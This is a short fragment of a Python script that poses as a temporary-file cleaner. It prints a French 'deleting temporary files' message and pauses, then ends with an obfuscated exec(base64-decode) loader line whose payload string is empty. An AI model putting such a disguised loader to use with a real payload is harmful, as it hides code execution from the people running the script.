...
os.system('echo Suppresion des fichiers temporaires en cours')
os.system('echo /\_/\ ')
os.system('timeout /T 20')
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('')[0]))
